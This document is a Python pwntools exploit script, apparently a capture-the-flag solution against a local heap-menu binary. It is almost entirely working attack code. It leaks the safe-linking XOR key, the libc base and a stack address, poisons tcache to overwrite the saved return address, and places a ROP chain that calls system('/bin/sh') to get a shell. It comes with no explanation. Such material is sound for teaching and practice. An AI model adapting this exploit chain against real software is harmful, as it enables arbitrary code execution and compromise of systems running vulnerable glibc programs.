from pwn import *
from subprocess import check_output
import sys
import os
_path = "./chall"
context.binary = exe = ELF(_path, checksec=False)
libc = exe.libc
#libc = ELF("./libc.so.6", checksec=False)
#ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
cmd = f'''
    set solib-search-path {os.getcwd()}
    continue
'''
context.terminal = ['/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-d', '.', 'wsl', '-e', 'bash', '-c']
def choice(idx):
    sla(b'{change this}', str(idx).encode())
def sl(_data):
    p.sendline(_data)
def sla(rgx, _data):
    p.sendlineafter(rgx, _data)
def se(_data):
    p.send(_data)
def sa(rgx, _data):
    p.sendafter(rgx, _data)
def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))
if args.LOCAL:
        if args.GDB:
            p = gdb.debug(_path, cmd)
        else:
            p = exe.process()
def create(idx, size, data):
    sla(b'> ', b'1')
    sla(b': ', str(idx).encode())
    sla(b': ', str(size).encode())
    sa(b': ', data)
def edit(idx, data):
    sla(b'> ', b'4')
    sla(b': ', str(idx).encode())
    sa(b': ', data)
def read_data(idx):
    sla(b'> ', b'3')
    sla(b': ', str(idx).encode())
def free(idx):
    sla(b'> ', b'2')
    sla(b': ', str(idx).encode())

#---------------EXP-------------#
create(0, 0x200, '0'*0x30)
create(1, 0x200, '1'*0x30)
create(2, 0x200, '2'*0x30)
create(3, 0x20, 'guard')
free(0)
read_data(0)
p.recvuntil(b'Data: ')
xor_key = u64(p.recvn(5).ljust(8, b'\x00'))
print("Heap: ", hex(xor_key))
heap = xor_key << 12
edit(0, p64(0)*2)
free(0)
edit(0, p64((heap+0x500)^xor_key))
create(0, 0x200, '3'*0x30)
create(4, 0x200, p64(0)*3+p64(0x421))
free(1)
read_data(1)
p.recvuntil(b'Data: ')
libc.address = u64(p.recvn(6).ljust(8, b'\x00'))- 0x1e7b20
print("Libc base: ", hex(libc.address))
free(0)
edit(0, p64(0)*2)
free(0)
edit(0, p64((libc.address+0x1eee28-0x18)^xor_key))
create(5, 0x200, 'aaaa')
create(6, 0x200, b'a'*0x18)
read_data(6)
p.recvuntil(b'a'*0x18)
stack = u64(p.recvn(6).ljust(8, b'\x00'))
print("stack: ", hex(stack))
free(0)
edit(0, p64(0)*2)
free(0)

saved_rip = stack - 0x158
edit(0, p64(saved_rip^xor_key))
create(7, 0x200, 'aaaa')
print("Will write at: ", hex(saved_rip))
ret=libc.address+0x0000000000026d40+1
poprdi = libc.address + 0x0000000000102dea
binsh = libc.address+0x1afea4
system = libc.sym.system
payload = p64(0) + p64(ret)+p64(poprdi)+p64(binsh)+p64(system)

create(8, 0x200, payload)
p.interactive()
